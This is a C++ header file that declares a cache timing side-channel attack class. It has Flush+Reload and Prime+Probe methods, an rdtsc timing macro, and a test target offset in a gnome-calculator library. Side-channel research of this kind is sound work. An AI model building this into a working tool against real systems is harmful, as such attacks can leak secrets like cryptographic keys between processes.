#ifndef CACHE_TIMING_ATTACK_HPP
#define CACHE_TIMING_ATTACK_HPP

#include <memory>
#include <stdio.h>
#include <ios>
#include <functional>
#include <tuple>

#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#include "cache_info/cache_info.hpp"

#define CTA_TEST_EXEC "/usr/lib/x86_64-linux-gnu/gnome-calculator/libcalculator.so"
#define CTA_TEST_OFFSET 0x27550

#define CTA_ASM_HIT(var_addr, var_time, instruc)

#define CTA_ASM_RDTSC_OP(instr) "mfence\n"\
				"lfence\n"\
				"rdtsc\n"\
				"lfence\n"\
				"movl %%eax, %%esi\n"\
				instr "\n"\
				"mfence\n"\
				"lfence\n"\
				"rdtsc\n"\
				"lfence\n"\
				"subl %%esi, %%eax\n"	

class CacheTimingAttack {

	protected:

		struct impl;
		std::unique_ptr<impl> pimpl;

		std::tuple<int, size_t> open_executable(const char* executable) const;

		std::tuple<void*, size_t> mmap_file(int fd, size_t size) const;	
	public:

		unsigned int hit_begin=0;
		unsigned int hit_end=0;

		void* addr() const;

		unsigned int time() const;

		void flush() const;
		void flush(void* addr) const;
		void access() const;
		void access(void* addr) const;

		virtual unsigned int time_hit(void* addr) const;
		virtual unsigned int time_miss(void* addr) const;
		virtual unsigned int probe(void* addr) const;
		
		bool was_accessed(unsigned int timestamp) const;

		unsigned int wait_for_access(unsigned int& misses) const;

		//return false in the given function to stop execution,
		//return true to wait for another access
		void call_when_offset_is_accessed(std::function<bool (unsigned int time, unsigned int misses)>) const;

		void prime(char* final_addr) const;
		bool probe(char* final_addr, std::function<bool (unsigned int time, unsigned int offset)>) const;
		void prime_probe(std::function<bool (unsigned int time, unsigned int offset)>) const;

		void change_exec(const char* executable, unsigned int offset);
		void alloc_exec(const char* executable, unsigned int offset);

		CacheTimingAttack();
		CacheTimingAttack(const char* executable, unsigned int offset);
		~CacheTimingAttack();

		CacheTimingAttack(const CacheTimingAttack&);
		CacheTimingAttack(CacheTimingAttack&&);

		CacheTimingAttack& operator=(const CacheTimingAttack& other);
		CacheTimingAttack& operator=(CacheTimingAttack&& other);
};

#endif
